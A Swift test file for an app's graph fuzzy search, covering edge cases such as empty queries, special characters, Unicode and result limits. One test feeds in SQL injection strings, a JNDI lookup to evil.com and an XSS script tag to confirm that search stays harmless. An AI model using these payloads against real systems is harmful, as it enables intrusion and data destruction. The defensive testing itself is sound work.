import Testing
@testable import Epistemos
import Foundation

// MARK: - Search Edge Case Tests
// Comprehensive tests for search boundary conditions and unusual inputs.

@Suite("Search Edge Cases - Empty and Minimal Queries")
@MainActor
struct SearchEmptyQueryTests {
    
    @Test("Empty query returns empty results")
    func emptyQuery() {
        let store = GraphStore()
        
        for i in 0..<5 {
            store.addNode(makeNode(id: "node-\(i)", label: "Label \(i)"))
        }
        
        let results = store.fuzzySearch(query: "", limit: 10)
        #expect(results.isEmpty)
    }
    
    @Test("Single character query")
    func singleCharacterQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "a", label: "Alpha"))
        store.addNode(makeNode(id: "b", label: "Beta"))
        store.addNode(makeNode(id: "c", label: "Gamma"))
        
        let results = store.fuzzySearch(query: "a", limit: 10)
        #expect(results.count >= 1)
    }
    
    @Test("Query matching nothing")
    func queryMatchingNothing() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Apple"))
        store.addNode(makeNode(id: "2", label: "Banana"))
        
        let results = store.fuzzySearch(query: "xyz", limit: 10)
        #expect(results.isEmpty)
    }
    
    @Test("Query matching everything")
    func queryMatchingEverything() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Common One"))
        store.addNode(makeNode(id: "2", label: "Common Two"))
        store.addNode(makeNode(id: "3", label: "Common Three"))
        
        let results = store.fuzzySearch(query: "Common", limit: 10)
        #expect(results.count == 3)
    }
    
    @Test("Whitespace-only query")
    func whitespaceOnlyQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Has Space"))
        
        let results = store.fuzzySearch(query: "   ", limit: 10)
        _ = results
    }
    
    @Test("Query with only punctuation")
    func punctuationOnlyQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Hello, World!"))
        
        let results = store.fuzzySearch(query: "!?,.", limit: 10)
        _ = results
    }
    
    @Test("Query with single space")
    func singleSpaceQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Two Words"))
        
        let results = store.fuzzySearch(query: " ", limit: 10)
        _ = results
    }
    
    @Test("Query with tab character")
    func tabCharacterQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Tab\tHere"))
        
        let results = store.fuzzySearch(query: "\t", limit: 10)
        _ = results
    }
    
    @Test("Query with newline character")
    func newlineCharacterQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Line1\nLine2"))
        
        let results = store.fuzzySearch(query: "\n", limit: 10)
        _ = results
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Special Characters")
@MainActor
struct SearchSpecialCharacterTests {
    
    @Test("Query with regex special characters")
    func regexSpecialCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "File.txt"))
        store.addNode(makeNode(id: "2", label: "Price $100"))
        store.addNode(makeNode(id: "3", label: "Math (a+b)"))
        
        let specialChars = [".", "$", "(", ")", "[", "]", "*", "+", "?", "^", "|"]
        
        for char in specialChars {
            let results = store.fuzzySearch(query: char, limit: 10)
            _ = results
        }
    }
    
    @Test("Query with SQL injection patterns")
    func sqlInjectionPatterns() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Normal Label"))
        
        let injectionPatterns = [
            "'; DROP TABLE nodes; --",
            "1' OR '1'='1",
            "'; DELETE FROM nodes; --",
            "' UNION SELECT * FROM passwords --",
            "${jndi:ldap://evil.com}",
            "<script>alert('xss')</script>",
        ]
        
        for pattern in injectionPatterns {
            let results = store.fuzzySearch(query: pattern, limit: 10)
            _ = results
        }
        
        #expect(store.nodeCount == 1)
    }
    
    @Test("Query with control characters")
    func controlCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Normal"))
        
        let controlChars = ["\0", "\n", "\r", "\t", "\u{0001}", "\u{001F}"]
        
        for char in controlChars {
            let results = store.fuzzySearch(query: char, limit: 10)
            _ = results
        }
    }
    
    @Test("Query with emoji")
    func emojiQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "🍎 Apple"))
        store.addNode(makeNode(id: "2", label: "🍌 Banana"))
        store.addNode(makeNode(id: "3", label: "No emoji"))
        
        let results = store.fuzzySearch(query: "🍎", limit: 10)
        #expect(results.count >= 1)
    }
    
    @Test("Query with combined characters")
    func combinedCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "café"))
        store.addNode(makeNode(id: "2", label: "cafe\u{0301}"))
        
        let results1 = store.fuzzySearch(query: "café", limit: 10)
        let results2 = store.fuzzySearch(query: "cafe", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("Query with backslash")
    func backslashQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Path\\To\\File"))
        
        let results = store.fuzzySearch(query: "\\", limit: 10)
        _ = results
    }
    
    @Test("Query with quote")
    func quoteQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "It's a test"))
        store.addNode(makeNode(id: "2", label: "He said \"Hello\""))
        
        let results1 = store.fuzzySearch(query: "'", limit: 10)
        let results2 = store.fuzzySearch(query: "\"", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("Query with percent")
    func percentQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "100% Complete"))
        
        let results = store.fuzzySearch(query: "%", limit: 10)
        _ = results
    }
    
    @Test("Query with ampersand")
    func ampersandQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "A & B"))
        
        let results = store.fuzzySearch(query: "&", limit: 10)
        _ = results
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Case Sensitivity")
@MainActor
struct SearchCaseSensitivityTests {
    
    @Test("Case insensitive matching")
    func caseInsensitiveMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "UPPERCASE"))
        store.addNode(makeNode(id: "2", label: "lowercase"))
        store.addNode(makeNode(id: "3", label: "MixedCase"))
        store.addNode(makeNode(id: "4", label: "MiXeDcAsE"))
        
        let queries = ["upper", "LOWER", "mixed", "Mixed", "MIXED"]
        
        for query in queries {
            let results = store.fuzzySearch(query: query, limit: 10)
            #expect(!results.isEmpty, "Query '\(query)' should find matches")
        }
    }
    
    @Test("Turkish I problem")
    func turkishI() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Istanbul"))
        store.addNode(makeNode(id: "2", label: "istanbul"))
        
        let results1 = store.fuzzySearch(query: "I", limit: 10)
        let results2 = store.fuzzySearch(query: "i", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("German sharp S")
    func germanSharpS() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Straße"))
        store.addNode(makeNode(id: "2", label: "STRASSE"))
        
        let results1 = store.fuzzySearch(query: "straße", limit: 10)
        let results2 = store.fuzzySearch(query: "strasse", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("All uppercase query")
    func allUppercaseQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Mixed Case Label"))
        
        let results = store.fuzzySearch(query: "MIXED", limit: 10)
        #expect(results.count >= 1)
    }
    
    @Test("All lowercase query")
    func allLowercaseQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Mixed Case Label"))
        
        let results = store.fuzzySearch(query: "mixed", limit: 10)
        #expect(results.count >= 1)
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Diacritics and Normalization")
@MainActor
struct SearchDiacriticTests {
    
    @Test("Diacritic insensitive search")
    func diacriticInsensitive() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "naïve"))
        store.addNode(makeNode(id: "2", label: "naive"))
        store.addNode(makeNode(id: "3", label: "résumé"))
        store.addNode(makeNode(id: "4", label: "resume"))
        
        let results1 = store.fuzzySearch(query: "naive", limit: 10)
        let results2 = store.fuzzySearch(query: "resume", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("Various accents")
    func variousAccents() {
        let store = GraphStore()
        
        let accented = [
            "café", "cafè", "cafê", "cafë",
            "naïve", "naîve", "naíve",
            "résumé", "resumé", "résumè"
        ]
        
        for (index, label) in accented.enumerated() {
            store.addNode(makeNode(id: "\(index)", label: label))
        }
        
        let results = store.fuzzySearch(query: "cafe", limit: 10)
        _ = results
    }
    
    @Test("CJK characters")
    func cjkCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "中文"))
        store.addNode(makeNode(id: "2", label: "日本語"))
        store.addNode(makeNode(id: "3", label: "한국어"))
        
        let results1 = store.fuzzySearch(query: "中", limit: 10)
        let results2 = store.fuzzySearch(query: "日", limit: 10)
        let results3 = store.fuzzySearch(query: "한", limit: 10)
        
        #expect(results1.count >= 1)
        #expect(results2.count >= 1)
        #expect(results3.count >= 1)
    }
    
    @Test("RTL text")
    func rtlText() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "مرحبا"))
        store.addNode(makeNode(id: "2", label: "שלום"))
        
        let results1 = store.fuzzySearch(query: "مرح", limit: 10)
        let results2 = store.fuzzySearch(query: "של", limit: 10)
        
        #expect(results1.count >= 1)
        #expect(results2.count >= 1)
    }
    
    @Test("Greek characters")
    func greekCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Αλφα"))
        store.addNode(makeNode(id: "2", label: "Βήτα"))
        
        let results = store.fuzzySearch(query: "αλφα", limit: 10)
        #expect(results.count >= 1)
    }
    
    @Test("Cyrillic characters")
    func cyrillicCharacters() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Привет"))
        
        let results = store.fuzzySearch(query: "привет", limit: 10)
        #expect(results.count >= 1)
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Query Length")
@MainActor
struct SearchQueryLengthTests {
    
    @Test("Very long query - 1000+ characters")
    func veryLongQuery() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Short"))
        
        let longQuery = String(repeating: "a", count: 1000)
        let results = store.fuzzySearch(query: longQuery, limit: 10)
        
        _ = results
    }
    
    @Test("Query longer than any label")
    func queryLongerThanLabels() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Hi"))
        store.addNode(makeNode(id: "2", label: "Hello"))
        
        let results = store.fuzzySearch(query: "This is a very long query", limit: 10)
        #expect(results.isEmpty)
    }
    
    @Test("Subsequence matching")
    func subsequenceMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Graph Store Tests"))
        
        let results = store.fuzzySearch(query: "gst", limit: 10)
        #expect(results.count >= 1)
        
        let results2 = store.fuzzySearch(query: "grph", limit: 10)
        #expect(results2.count >= 1)
    }
    
    @Test("Prefix matching")
    func prefixMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Application"))
        store.addNode(makeNode(id: "2", label: "Apply"))
        store.addNode(makeNode(id: "3", label: "Apple"))
        
        let results = store.fuzzySearch(query: "app", limit: 10)
        #expect(results.count >= 3)
    }
    
    @Test("Suffix matching")
    func suffixMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Running"))
        store.addNode(makeNode(id: "2", label: "Jumping"))
        store.addNode(makeNode(id: "3", label: "Walking"))
        
        let results = store.fuzzySearch(query: "ing", limit: 10)
        #expect(results.count >= 3)
    }
    
    @Test("Contains matching")
    func containsMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Background"))
        store.addNode(makeNode(id: "2", label: "Foreground"))
        
        let results = store.fuzzySearch(query: "ground", limit: 10)
        #expect(results.count >= 2)
    }
    
    @Test("Word boundary matching")
    func wordBoundaryMatching() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Graph Store Tests"))
        
        let results = store.fuzzySearch(query: "gst", limit: 10)
        #expect(results.count >= 1)
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Scoring and Limits")
@MainActor
struct SearchScoringTests {
    
    @Test("Score ordering - exact match highest")
    func exactMatchScore() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Test"))
        store.addNode(makeNode(id: "2", label: "Testing"))
        store.addNode(makeNode(id: "3", label: "My Test"))
        
        let results = store.fuzzySearch(query: "test", limit: 10)
        
        if let first = results.first {
            #expect(first.node.label.lowercased() == "test")
            #expect(first.score == 1.0)
        }
    }
    
    @Test("Score ordering - prefix second")
    func prefixScore() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Testing"))
        store.addNode(makeNode(id: "2", label: "Test"))
        
        let results = store.fuzzySearch(query: "test", limit: 10)
        
        for i in 1..<results.count {
            #expect(results[i-1].score >= results[i].score)
        }
    }
    
    @Test("Limit parameter respected")
    func limitRespected() {
        let store = GraphStore()
        
        for i in 0..<100 {
            store.addNode(makeNode(id: "\(i)", label: "Item \(i)"))
        }
        
        let limit = 5
        let results = store.fuzzySearch(query: "item", limit: limit)
        #expect(results.count <= limit)
    }
    
    @Test("Zero limit")
    func zeroLimit() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Test"))
        
        let results = store.fuzzySearch(query: "test", limit: 0)
        #expect(results.isEmpty)
    }
    
    @Test("Negative limit handling")
    func negativeLimit() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Test"))
        
        let results = store.fuzzySearch(query: "test", limit: 1)
        #expect(results.count <= 1)
    }
    
    @Test("Large limit")
    func largeLimit() {
        let store = GraphStore()
        
        for i in 0..<50 {
            store.addNode(makeNode(id: "\(i)", label: "Common \(i)"))
        }
        
        let results = store.fuzzySearch(query: "common", limit: 1000)
        #expect(results.count == 50)
    }
    
    @Test("Score range validation")
    func scoreRangeValidation() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Exact"))
        store.addNode(makeNode(id: "2", label: "Exactly"))
        store.addNode(makeNode(id: "3", label: "Not Exact"))
        
        let results = store.fuzzySearch(query: "exact", limit: 10)
        
        for result in results {
            #expect(result.score >= 0 && result.score <= 1)
        }
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Node Type Filtering")
@MainActor
struct SearchNodeTypeTests {
    
    @Test("Search across all node types")
    func searchAllTypes() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", type: .note, label: "Common"))
        store.addNode(makeNode(id: "2", type: .tag, label: "Common"))
        store.addNode(makeNode(id: "3", type: .source, label: "Common"))
        
        let results = store.fuzzySearch(query: "common", limit: 10)
        #expect(results.count == 3)
    }
    
    @Test("Search with special node type names")
    func searchSpecialTypeNames() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", type: .note, label: "Note about tags"))
        store.addNode(makeNode(id: "2", type: .tag, label: "Tag"))
        
        let results = store.fuzzySearch(query: "tag", limit: 10)
        #expect(results.count >= 1)
    }
    
    @Test("Search each node type")
    func searchEachNodeType() {
        let store = GraphStore()
        
        let types = GraphNodeType.allCases
        
        for (index, type) in types.enumerated() {
            store.addNode(makeNode(id: "\(index)", type: type, label: "Type \(type)"))
        }
        
        for type in types {
            let results = store.fuzzySearch(query: String(describing: type).lowercased(), limit: 10)
            #expect(results.count >= 1)
        }
    }
    
    private func makeNode(id: String, type: GraphNodeType, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: type, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Unicode Normalization")
@MainActor
struct SearchUnicodeNormalizationTests {
    
    @Test("NFC vs NFD normalization")
    func nfcNfdNormalization() {
        let store = GraphStore()
        
        let nfc = "café"
        let nfd = "cafe\u{0301}"
        
        store.addNode(makeNode(id: "1", label: nfc))
        
        let results = store.fuzzySearch(query: nfd, limit: 10)
        _ = results
    }
    
    @Test("Compatibility equivalence")
    func compatibilityEquivalence() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "① One"))
        store.addNode(makeNode(id: "2", label: "(1) One"))
        store.addNode(makeNode(id: "3", label: "1 One"))
        
        let results = store.fuzzySearch(query: "1", limit: 10)
        _ = results
    }
    
    @Test("Width variants")
    func widthVariants() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "ＡＢＣ"))
        store.addNode(makeNode(id: "2", label: "ABC"))
        
        let results1 = store.fuzzySearch(query: "ABC", limit: 10)
        let results2 = store.fuzzySearch(query: "ＡＢＣ", limit: 10)
        
        _ = results1
        _ = results2
    }
    
    @Test("Unicode combining jamo")
    func combiningJamo() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "한글"))
        
        let results = store.fuzzySearch(query: "한글", limit: 10)
        #expect(results.count >= 1)
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}

@Suite("Search Edge Cases - Empty Graph")
@MainActor
struct SearchEmptyGraphTests {
    
    @Test("Search on empty graph")
    func searchOnEmptyGraph() {
        let store = GraphStore()
        
        let results = store.fuzzySearch(query: "anything", limit: 10)
        #expect(results.isEmpty)
    }
    
    @Test("Search on graph with empty labels")
    func searchOnEmptyLabels() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: ""))
        store.addNode(makeNode(id: "2", label: ""))
        
        let results = store.fuzzySearch(query: "test", limit: 10)
        #expect(results.isEmpty)
    }
    
    @Test("Search on single node graph")
    func searchOnSingleNode() {
        let store = GraphStore()
        
        store.addNode(makeNode(id: "1", label: "Only"))
        
        let results = store.fuzzySearch(query: "only", limit: 10)
        #expect(results.count == 1)
    }
    
    private func makeNode(id: String, label: String) -> GraphNodeRecord {
        GraphNodeRecord(
            id: id, type: .note, label: label, sourceId: nil,
            metadata: GraphNodeMetadata(), weight: 1.0,
            createdAt: .now, position: .zero, velocity: .zero
        )
    }
}
